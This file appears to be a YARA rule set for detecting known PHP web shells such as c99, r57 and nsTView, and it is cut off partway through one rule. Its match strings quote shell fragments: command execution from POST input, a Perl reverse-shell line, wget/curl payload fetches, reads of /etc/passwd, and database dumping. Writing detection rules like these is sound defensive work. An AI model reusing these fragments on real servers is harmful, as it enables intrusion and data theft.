/*
   YARA Rule Set
   Author: WatcherLab
   Date: 2019-01-02
   Identifier: php
*/

/* Rule Set ----------------------------------------------------------------- */








rule RedhatC99__login_redhat_pass_root_ {
   meta:
      description = "php - file RedhatC99 [login=redhat-pass=root]"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "a4db77895228f02ea17ff48976e03100ddfaef7c9f48c1d40462872f103451d5"
   strings:
      $x1 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii
      $x2 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\");}" fullword ascii
      $x3 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";" fullword ascii
      $x4 = "?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"<?ph" ascii
      $x5 = "displaysecinfo(\"Kernel version?\",myshellexec(\"sysctl -a | grep version\"));" fullword ascii
      $x6 = "function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $x7 = "echo \"<br><br><input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Dump\\\"><br><br><b><sup>1</sup></b> - all, if empty\";" fullword ascii
      $x8 = "if ($ext == \"c\") {$retgcc = myshellexec(\"gcc -o \".$binpath.\" \".$srcpath); @unlink($srcpath);}" fullword ascii
      $x9 = "if ($ext == \"c\") {$retgcc = myshellexec(\"gcc -o \".$binpath.\" \".$srcpath);  @unlink($srcpath);}" fullword ascii
      $x10 = "if ($act == \"about\") {echo \"<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tip" ascii
      $x11 = "echo \"<b>Download: </b>&nbsp;<input type=\\\"checkbox\\\" name=\\\"sql_dump_download\\\" value=\\\"1\\\" checked><br><br>\";" fullword ascii
      $x12 = "else {echo \"<b>Execution command</b>\"; if (empty($cmd_txt)) {$cmd_txt = TRUE;}}" fullword ascii
      $x13 = "# MySQL version: (\".mysql_get_server_info().\") running on \".getenv(\"SERVER_ADDR\").\" (\".getenv(\"SERVER_NAME\").\")\".\"" fullword ascii
      $x14 = "$logfile = $tmpdir_logs.\"c99sh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $x15 = "$sql_passwd).\"&sql_server=\".htmlspecialchars($sql_server).\"&sql_port=\".htmlspecialchars($sql_port).\"&sql_act=processes\");" fullword ascii
      $s16 = "<center><a href=\\\"\".$surl.\"act=processes&grep=\".basename($binpath).\"\\\"><u>View datapipe process</u></a></center>\";}" fullword ascii
      $s17 = "echo \"<form method=\\\"GET\\\"><input type=\\\"hidden\\\" name=\\\"act\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" name=" ascii
      $s18 = "if (file_get_contents($v)) {echo \"<b><font color=red>You can't crack winnt passwords(\".$v.\") </font></b><br>\";}" fullword ascii
      $s19 = "\"<b>nc -v \".getenv(\"SERVER_ADDR\").\" \".$bind[\"port\"].\"</b>\\\"!<center><a href=\\\"\".$surl.\"act=processes&grep=\".base" ascii
      $s20 = "echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecialchars($sq" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and all of them
}









rule php_pws {
   meta:
      description = "php - file pws.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "a34154af7c0d7157285cfa498734cfb77662edadb1a10892eb7f7e2fb5e2486c"
   strings:
      $s1 = "<div align=\"left\"><font size=\"1\">Uploader file :</font></div>" fullword ascii
      $s2 = "<form name=\"cmd\" method=\"POST\" enctype=\"multipart/form-data\">" fullword ascii
      $s3 = "<div align=\"left\"><font size=\"1\">Input command :</font></div>" fullword ascii
      $s4 = "<form name=\"form1\" method=\"post\" enctype=\"multipart/form-data\">" fullword ascii
      $s5 = "<input type=\"text\" name=\"dir\" size=\"30\" value=\"<? passthru(\"pwd\"); ?>\">" fullword ascii
      $s6 = "$cmd = $_POST['cmd'];" fullword ascii
      $s7 = "if ($_POST['cmd']){" fullword ascii
      $s8 = "$uploaded = $_FILES['file']['tmp_name'];" fullword ascii
      $s9 = "<input type=\"submit\" name=\"submit2\" value=\"Upload\">" fullword ascii
      $s10 = "passthru($cmd);" fullword ascii
      $s11 = "<input type=\"text\" name=\"cmd\" size=\"30\" class=\"input\"><br>" fullword ascii
      $s12 = "$pwddir = $_POST['dir'];" fullword ascii
      $s13 = "echo \"FILE UPLOADED TO $dez\";" fullword ascii
      $s14 = "if (file_exists($uploaded)) {" fullword ascii
      $s15 = "<input type=\"file\" name=\"file\" size=\"15\">" fullword ascii
      $s16 = "$real = $_FILES['file']['name'];" fullword ascii
      $s17 = "copy($uploaded, $dez);" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 2KB and
      8 of them
}

rule ru24_post_sh {
   meta:
      description = "php - file ru24_post_sh.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "72c49b669de69155b2f8d8aea6004005e260b3911b8868f306bbefdf1324b264"
   strings:
      $s1 = "<title>Ru24PostWebShell - \".$_POST['cmd'].\"</title>" fullword ascii
      $s2 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a;ls -la\"; }" fullword ascii
      $s3 = "$function=passthru; // system, exec, cmd" fullword ascii
      $s4 = "echo \"\".$function($_POST['cmd']).\"</pre></body></html>\";" fullword ascii
      $s5 = "Ru24PostWebShell" fullword ascii
      $s6 = "echo \"<input type=text name=cmd size=85>\";" fullword ascii
      $s7 = "http://www.ru24-team.net" fullword ascii
      $s8 = "<meta http-equiv='pragma' content='no-cache'>" fullword ascii
      $s9 = "echo \"<form method=post>\";" fullword ascii
      $s10 = "</head><body>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}



rule php_PHVayv {
   meta:
      description = "php - file PHVayv.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "49c0747721f7e7e5d776d23d83f705951595de8e63df7b7afb43824f4a3415f3"
   strings:
      $s1 = "<form method=\"POST\" action=\"<?echo \"PHVayv.php?duzkaydet=$dizin/$duzenle&dizin=$dizin\"?>\" name=\"kaypos\">" fullword ascii
      $s2 = "<img border=\"0\" src=\"http://www.aventgrup.net/avlog.gif\"></td>" fullword ascii
      $s3 = "<form method=\"POST\" action=\"<?echo \"$fistik.php?yenidosya=1&dizin=$dizin\"?>\" " fullword ascii
      $s4 = "<form method=\"POST\" action=\"<?echo \"$fistik.php?yeniklasor=1&dizin=$dizin\"?>\" " fullword ascii
      $s5 = "<a href=\"<?echo \"$fistik\";?>.php?sildos=<?echo $ekinci;?>&dizin=<?echo $dizin;?>\" style=\"text-decoration: none\">" fullword ascii
      $s6 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1254\">" fullword ascii
      $s7 = "<a href=\"<?echo \"$fistik.php?silklas=$dizin/$ekinci&dizin=$dizin\"?>\" style=\"text-decoration: none\">" fullword ascii
      $s8 = "<a href=\"<?echo \"$fistik.php?dizin=$dizin/\" ?><?echo \"$ekinci\";?>\" style=\"text-decoration: none\">" fullword ascii
      $s9 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/1.gif\"></td>" fullword ascii
      $s10 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\"></td>" fullword ascii
      $s11 = "00000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left\"" fullword ascii
      $s12 = "<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: collapse\" bordercolor=\"#111111\" width=\"100" fullword ascii
      $s13 = "<td rowspan=\"2\" height=\"19\"><font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<?echo \"$dizin/$duzenle\"?></font></td>" fullword ascii
      $s14 = "000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left\"" fullword ascii
      $s15 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-CENTER: #000000 1px inset; BORDER-RIGHT: #0" fullword ascii
      $s16 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000" fullword ascii
      $s17 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT" fullword ascii
      $s18 = "<a href=\"<?echo \"$fistik.php?yenklas=1&dizin=$dizin\";?>\" style=\"text-decoration: none\">" fullword ascii
      $s19 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword ascii
      $s20 = "<a href=\"http://www.aventgrup.net\" style=\"text-decoration: none\">" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}



rule php_nshell {
   meta:
      description = "php - file nshell.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "1badfeb5dcf0dbf17d9daf39f6572db41e7a142a5322ccc81af3e6be00366a97"
   strings:
      $s1 = "echo \"<font color=\\\"black\\\"><a href=\".$_SERVER['PHP_SELF'].\"?act=info target=_blank>Php Info</a></font><br></div>\";" fullword ascii
      $s2 = "$function=passthru; // system, exec, cmd" fullword ascii
      $s3 = "$con=@mysql_connect($servername,$_GET['uname'],$_GET['pass']) or die(\"Khong the connect duoc !\");" fullword ascii
      $s4 = "$s.=sprintf(\"%1s%1s%1s\", $group['read'], $group['write'], $group['execute']);" fullword ascii
      $s5 = "$s.=sprintf(\"%1s%1s%1s\", $world['read'], $world['write'], $world['execute']);" fullword ascii
      $s6 = "$s.=sprintf(\"%1s%1s%1s\", $owner['read'], $owner['write'], $owner['execute']);" fullword ascii
      $s7 = "if( $mode & 0x400 ) $group[\"execute\"] = ($group['execute']=='x') ? 's' : 'S';" fullword ascii
      $s8 = "if( $mode & 0x800 ) $owner[\"execute\"] = ($owner['execute']=='x') ? 's' : 'S';" fullword ascii
      $s9 = "if( $mode & 0x200 ) $world[\"execute\"] = ($world['execute']=='x') ? 't' : 'T';" fullword ascii
      $s10 = "$form1=\"<center><form method=GET action='\".$_SERVER['PHP_SELF'].\"'><table width=100% boder=0><td width=100%> User Name : <inp" ascii
      $s11 = "echo \"user=\".@get_current_user().\" uid=\".@getmyuid().\" gid=\".@getmygid()." fullword ascii
      $s12 = "$group[\"execute\"] = ($mode & 00010) ? 'x' : '-';" fullword ascii
      $s13 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-';" fullword ascii
      $s14 = "$owner[\"execute\"] = ($mode & 00100) ? 'x' : '-';" fullword ascii
      $s15 = "}elseif(function_exists(\"shell_exec\"))" fullword ascii
      $s16 = "$res=shell_exec($comd);" fullword ascii
      $s17 = "text name=pass size=20> Port : <input type=text name=port size=20><input type=submit value=login></form></td></form></table><hr " ascii
      $s18 = "if(mysql_affected_rows($result)>=0) echo \"Affected rows : \".mysql_affected_rows($result).\"This is Ok ! ^.^<br>\";" fullword ascii
      $s19 = "echo \"<b><font color=\\\"#000000\\\" size=\\\"3\\\" face=\\\"Georgia\\\"> System information: :</font><br>\";             $ra44" ascii
      $s20 = "if(isset($_GET['srname'])&&isset($_GET['pass']))" fullword ascii
   condition:
      uint16(0) == 0xbb3f and filesize < 40KB and
      8 of them
}







/* Super Rules ------------------------------------------------------------- */

rule _nsTView_v2_1_nstview_0 {
   meta:
      description = "php - from files nsTView v2.1.txt, nstview.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "65876ca1dde6923447642de1dbcc198b7f5bbe53c26d7eae7f1d675cb5f68774"
      hash2 = "a111977d2403dd241ef2fabe841b96535f05d004a276e12ad29462b565b8aaa8"
   strings:
      $x1 = "John The Ripper [<a href=http://www.openwall.com/john/ target=_blank>Web</a>]</form><br>\";" fullword ascii
      $x2 = "$serv = @mysql_connect($adress.\":\".$port, $login,$pass) or die(\"<font color=red>Error: \".mysql_error().\"</font>\");" fullword ascii
      $x3 = "# example: Delete autoexec.bat (nst) del c:\\autoexec.bat" fullword ascii
      $x4 = "[<a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tbl" ascii
      $x5 = "<form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&vnutr=1&baza=1&vn=$vn&db=$db'>" fullword ascii
      $x6 = "</form><form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&baza=1&vn=$vn&db=$db'>" fullword ascii
      $x7 = "[<a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tb" fullword ascii
      $x8 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii
      $x9 = "md5 online encoder/decoder (brutforce) (php) - [<a href=http://nst.void.ru/?q=releases&download=4>DOWNLOAD</a>]" fullword ascii
      $x10 = "Read file content using MySQL - when <b>safe_mode</b>, <b>open_basedir</b> is <font color=green>ON</font><Br>" fullword ascii
      $s11 = "open STDIN,\\\"<&X\\\";open STDOUT,\\\">&X\\\";open STDERR,\\\">&X\\\";exec(\\\"/bin/sh -i\\\");" fullword ascii
      $s12 = "# Dump from: \".$_SERVER[\"SERVER_NAME\"].\" (\".$_SERVER[\"SERVER_ADDR\"].\")" fullword ascii
      $s13 = "<font color=green><b>You can change temp folder for dump file in your browser!<br>" fullword ascii
      $s14 = "1&p=sql&vn=$str[0]&baza=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]&ins_new_line=1'>$str[0]</a><br>\";" fullword ascii
      $s15 = "<font color=red>Change variable &f_d=(here writable directory, expl: /tmp or c:/windows/temp)</font><br>" fullword ascii
      $s16 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1" ascii
      $s17 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii
      $s18 = "1&p=sql&vn=$str[0]&baza=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]'>$str[0]</a><br>\";" fullword ascii
      $s19 = "if($_GET['dump_download']){" fullword ascii
      $s20 = "<tr><td>Login:</td><td><input name=l value=\".$_POST['l'].\"></td></tr>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _r57_r57shell_r57_iFX_r57_kartal_r57_Mohajer22_1 {
   meta:
      description = "php - from files r57.txt, r57shell.txt, r57_iFX.txt, r57_kartal.txt, r57_Mohajer22.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash2 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
      hash3 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
      hash4 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash5 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
   strings:
      $x1 = "@mssql_query(\"insert into r57_temp_table EXEC master.dbo.xp_cmdshell '\".$_POST['test4_file'].\"'\",$db);" fullword ascii
      $x2 = "$blah = ex($p2.\" /tmp/dp \".$_POST['local_port'].\" \".$_POST['remote_host'].\" \".$_POST['remote_port'].\" &\");" fullword ascii
      $x3 = "$_POST['cmd'] = which('curl').\" \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii
      $s4 = "echo sr(15,\"<b>\".$lang[$language.'_text53'].$arrow.\"</b>\",in('text','s_dir',85,$dir).\" * ( /root;/home;/tmp )\");" fullword ascii
      $s5 = "echo sr(15,\"<b>\".$lang[$language.'_text73'].$arrow.\"</b>\",in('text','s_dir',85,$dir).\" * ( /root;/home;/tmp )\");" fullword ascii
      $s6 = "or print(\"<font color=red face=Fixedsys><div align=center>Error uploading file \".$HTTP_POST_FILES['userfile']['name'].\"</d" fullword ascii
      $s7 = "$_POST['cmd'] = 'find '.$_POST['s_dir'].' -name \\''.$_POST['s_mask'].'\\' | xargs grep -E \\''.$_POST['s_text'].'\\'';" fullword ascii
      $s8 = "$_POST['cmd'] = which('links').\" -source \".$_POST['rem_file'].\" > \".$_POST['loc_file'].\"\";" fullword ascii
      $s9 = "$_POST['cmd'] = which('lynx').\" -source \".$_POST['rem_file'].\" > \".$_POST['loc_file'].\"\";" fullword ascii
      $s10 = "$_POST['cmd'] = which('wget').\" \".$_POST['rem_file'].\" -O \".$_POST['loc_file'].\"\";" fullword ascii
      $s11 = "$blah = ex(\"/tmp/dpc \".$_POST['local_port'].\" \".$_POST['remote_port'].\" \".$_POST['remote_host'].\" &\");" fullword ascii
      $s12 = "if ($_POST['cmd']==\"mysql_dump\")" fullword ascii
      $s13 = "if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']==\"C\"))" fullword ascii
      $s14 = "$_POST['cmd']=\"echo \\\"Now script try connect to \".$_POST['ip'].\" port \".$_POST['port'].\" ...\\\"\";" fullword ascii
      $s15 = "$blah = ex($p2.\" /tmp/back \".$_POST['ip'].\" \".$_POST['port'].\" &\");" fullword ascii
      $s16 = "if(!empty($_POST['s_dir']) && !empty($_POST['s_text']) && !empty($_POST['cmd']) && $_POST['cmd'] == \"search_text\")" fullword ascii
      $s17 = "JmltPTEmcj0iK2VzY2FwZShkb2N1bWVudC5yZWZlcnJlcikrIiZwZz0iK2VzY2FwZSh3aW5kb3cubG9jYXRpb24uaHJlZik7ZG9jdW1lbnQuY29va2l" fullword ascii /* base64 encoded string '&im=1&r="+escape(document.referrer)+"&pg="+escape(window.location.href);document.cooki' */
      $s18 = "J3gnK3NjcmVlbi5oZWlnaHQrIiZweD0iKygoKG5hdmlnYXRvci5hcHBOYW1lLnN1YnN0cmluZygwLDMpPT0iTWljIikpP3NjcmVlbi5jb2xvckRlcHR" fullword ascii /* base64 encoded string ''x'+screen.height+"&px="+(((navigator.appName.substring(0,3)=="Mic"))?screen.colorDept' */
      $s19 = "dGxvZy9jb3VudD8iK2hvdGxvZ19yKyImJyBib3JkZXI9MCB3aWR0aD0xIGhlaWdodD0xIGFsdD0xPjwvYT4iKTwvc2NyaXB0Pjxub3NjcmlwdD48YSB" fullword ascii /* base64 encoded string 'tlog/count?"+hotlog_r+"&' border=0 width=1 height=1 alt=1></a>")</script><noscript><a ' */
      $s20 = "$blah = ex(\"/tmp/bd \".$_POST['port'].\" \".$_POST['bind_pass'].\" &\");" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _NIX_REMOTE_WEB_SHELL_NIX_REMOTE_WEB_SHELL_v_0_5_alpha_Lite_Public_Version_2 {
   meta:
      description = "php - from files NIX REMOTE WEB SHELL.txt, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "51c3681b794a5b72f89a060fb21af32d11f1722b066b5063b962ebe99a3643cc"
      hash2 = "de84cafd9dd3faf0cf6987e7e6afc7aad90d249a00794aad5e83a6222ffe974f"
   strings:
      $x1 = "if (file_get_contents(\"/etc/httpd.conf\")) {echo \"<b><a href=?ac=navigation&d=/var/cpanel&e=accounting.log><u><b>cpanel log  " fullword ascii
      $x2 = "fputs($f,\"Enter on ftp:\\nFTPhosting:\\t$host\\nLogin:\\t$login\\nPassword:\\t$password\\n \");" fullword ascii
      $x3 = "login:password - \".$ftp_user_name.\":\".$ftp_user_name.\"</b><br>\";" fullword ascii
      $x4 = "<u><b>$fullpath</b></u>  \".exec(\"tar -zc $fullpath -f $charsname.tar.gz\").\"" fullword ascii
      $x5 = "if ((!$_POST['dir']) OR ($_POST['dir']==\"\")) { echo \"<input type=hidden name=dir size=85 value=\".exec(\"pwd\").\">\"; }" fullword ascii
      $x6 = "if ((!$_POST['dir']) OR ($_POST['dir']==\"\")) { echo \"<input type=text name=dir size=85 value=\".exec(\"pwd\").\">\"; }" fullword ascii
      $s7 = "if (file_get_contents(\"/etc/httpd.conf\")) {echo \"<b><a href=?ac=navigation&d=/var/cpanel&e=accounting.log><u><b>cpanel log  <" ascii
      $s8 = "if (file_get_contents(\"/etc/httpd.conf\")) {echo \"<b><a href=?ac=navigation&d=/etc/&e=httpd.conf><u><b>" fullword ascii
      $s9 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a;ls -lad\"; }" fullword ascii
      $s10 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><a href=\\\"\".$surl.\"act=f&f=accounting.log&d=/var/cpanel/&f" ascii
      $s11 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><a href=\\\"\".$surl.\"act=f&f=accounting.log&d=/var/cpanel/&f" ascii
      $s12 = "/* command execute form */" fullword ascii
      $s13 = "$blah=exec(\"gcc -o /tmp/backc /tmp/back.c\");" fullword ascii
      $s14 = "$blah=exec(\"gcc -o /tmp/bd /tmp/bd.c\");" fullword ascii
      $s15 = "$login_result=@ftp_login($conn_id, $ftp_user_name, $ftp_user_pass);" fullword ascii
      $s16 = "document.command.cmd.value = str;" fullword ascii
      $s17 = "else {echo \"<br><a href=?ac=navigation&d=/etc/&e=passwd><b><u>Get /etc/passwd</u></b></a><br>\";}" fullword ascii
      $s18 = "/* command execute */" fullword ascii
      $s19 = "$bc_string=\"perl /tmp/back \".$_POST['ip'].\" \".$_POST['port'].\" &\";" fullword ascii
      $s20 = "echo $ftp_user_name.\" - error<br>\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _PHP_Shell_Safe0ver_Shell__Safe_Mod_Bypass_By_Evilc0der_3 {
   meta:
      description = "php - from files PHP Shell.txt, Safe0ver Shell -Safe Mod Bypass By Evilc0der.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "61c4fcb6e788c0dffcf0b672ae42b1676f8a9beaa6ec7453fc59ad821a4a8127"
      hash2 = "bd042178254f1f1362332712488a040afdb1b5557f7f0d0c8ad565c5c1ac9607"
   strings:
      $x1 = "echo sp(3).buildUrl( $img[\"Execute\"], \"cmd=execute&file=$dir/$file\").\"\\n\";" fullword ascii
      $x2 = "elseif ( $cmd==\"execute\" ) {/*<!-- Execute the executable -->*/" fullword ascii
      $x3 = "elseif ( $cmd==\"uploadproc\" ) { /* <!-- Process Uploaded file --> */" fullword ascii
      $s4 = "elseif ( $cmd==\"edit\" ) { /*<!-- Edit a file and save it afterwards with the saveedit block. --> */" fullword ascii
      $s5 = "/* <!-- Execute --> */" fullword ascii
      $s6 = "<center>&nbsp;<?php echo $scriptident ?> - <?php echo $scriptver ?> - <?php echo $scriptdate ?>&nbsp;</center>" fullword ascii
      $s7 = "header(\"Content-Disposition: attachment; filename=$downloadto$add\");" fullword ascii
      $s8 = "elseif ( $cmd==\"saveedit\" ) { /*<!-- Save the edited file back to a file --> */" fullword ascii
      $s9 = "elseif ( $cmd==\"newdir\" ) { /*<!-- Create new directory with default name --> */" fullword ascii
      $s10 = "elseif ( $cmd==\"deldir\" ) { /*<!-- Delete a directory and all it's files --> */" fullword ascii
      $s11 = "<!-- <?php echo $scriptident ?>, <?php echo $scriptver ?>, <?php echo $scriptdate ?>  -->" fullword ascii
      $s12 = "elseif ( $cmd==\"newfile\" ) { /*<!-- Create new file with default name --> */" fullword ascii
      $s13 = "elseif ( $cmd==\"downl\" ) { /*<!-- Save the edited file back to a file --> */" fullword ascii
      $s14 = "elseif ( $cmd==\"ren\" ) { /* <!-- File and Directory Rename --> */" fullword ascii
      $s15 = "if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset($PHP_AUTH_USER) || $PHP_AUTH_USER != $http_auth_" fullword ascii
      $s16 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ " fullword ascii
      $s17 = "elseif ( $cmd==\"file\" ) { /* <!-- View a file in text --> */" fullword ascii
      $s18 = "***************************************************************************************** " fullword ascii
      $s19 = "echo sp(3). buildUrl( $img[\"Download\"], \"cmd=downl&file=$dir/$file\").\"\\n\";" fullword ascii
      $s20 = "echo sp(3).buildUrl( $img[\"Delete\"], \"cmd=deldir&file=$dir/$file&lastcmd=dir&lastdir=$dir\").\"\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _r57shell_r57_Mohajer22_4 {
   meta:
      description = "php - from files r57shell.txt, r57_Mohajer22.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
      hash2 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
   strings:
      $x1 = "ox','dif id=dif',0,'1').in('text','dif_name',31,(!empty($_POST['dif_name'])?($_POST['dif_name']):(\"dump.sql\"))));" fullword ascii
      $s2 = "$this->dump[] = '## --------------------------------------- ';" fullword ascii
      $s3 = "$this->dump[1] = '## --------------------------------------- ';" fullword ascii
      $s4 = "$this->dump[5] = '## --------------------------------------- ';" fullword ascii
      $s5 = "else if(!$sql->dump($_POST['mysql_tbl'])) { echo \"[-] ERROR! Can't create dump\"; }" fullword ascii
      $s6 = "if(empty($_POST['dif'])) { foreach($sql->dump as $v) echo $v.\"\\r\\n\"; }" fullword ascii
      $s7 = "ver']):(\"localhost\"))).' <b>:</b> '.in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):(\"3306\"))));" fullword ascii
      $s8 = "]):(\"mysql\"))).' <b>.</b> '.in('text','mysql_tbl',15,(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):(\"user\"))));" fullword ascii
      $s9 = "echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\"<b>\".$lang[$language.'_text41'].$arrow.\"</b>\",in('ch" ascii
      $s10 = "$this->connection = @mssql_connect($this->host.','.$this->port,$this->user,$this->pass);" fullword ascii
      $s11 = "$this->connection = @mysql_connect($this->host.':'.$this->port,$this->user,$this->pass);" fullword ascii
      $s12 = "$this->dump[2] = '##  Created: '.date (\"d/m/Y H:i:s\");" fullword ascii
      $s13 = "$extra = \"-C \".$_POST['test5_file'].\" -X /tmp/mb_send_mail\";" fullword ascii
      $s14 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_query\")&&($_POST['cmd']!=\"ftp_bru" ascii
      $s15 = "'eng_text114'=>'Test bypass safe_mode, view file contest via imap_body'," fullword ascii
      $s16 = "echo sr(35,\"<b>\".$lang[$language.'_text84'].$arrow.\"</b>\".in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_query'),\"\");" fullword ascii
      $s17 = "$this->dump[0] = '## PostgreSQL dump';" fullword ascii
      $s18 = "$this->connection = @ocilogon($this->user, $this->pass, $this->base);" fullword ascii
      $s19 = "else { echo \"[-] ERROR! Can't write in dump file\"; }" fullword ascii
      $s20 = "'eng_text112'=>'Test bypass safe_mode with function mb_send_mail'," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _PH_Vayv_PHVayv_5 {
   meta:
      description = "php - from files PH Vayv.txt, PHVayv.txt"
      author = "WatcherLab"
      date = "2019-01-02"
      hash1 = "3c9b4a962ecc4545922cf9055fbed2b85d91ff8b7f29db40fbf903bef69f8836"
      hash2 = "49c0747721f7e7e5d776d23d83f705951595de8e63df7b7afb43824f4a3415f3"
   strings:
      $s1 = "<form method=\"POST\" action=\"<?echo \"PHVayv.php?duzkaydet=$dizin/$duzenle&dizin=$dizin\"?>\" name=\"kaypos\">" fullword ascii
      $s2 = "<img border=\"0\" src=\"http://www.aventgrup.net/avlog.gif\"></td>" fullword ascii
      $s3 = "<form method=\"POST\" action=\"<?echo \"$fistik.php?yenidosya=1&dizin=$dizin\"?>\" " fullword ascii
      $s4 = "<form method=\"POST\" action=\"<?echo \"$fistik.php?yeniklasor=1&dizin=$dizin\"?>\" " fullword ascii
      $s5 = "<a href=\"<?echo \"$fistik\";?>.php?sildos=<?echo $ekinci;?>&dizin=<?echo $dizin;?>\" style=\"text-decoration: none\">" fullword ascii
      $s6 = "<a href=\"<?echo \"$fistik.php?silklas=$dizin/$ekinci&dizin=$dizin\"?>\" style=\"text-decoration: none\">" fullword ascii
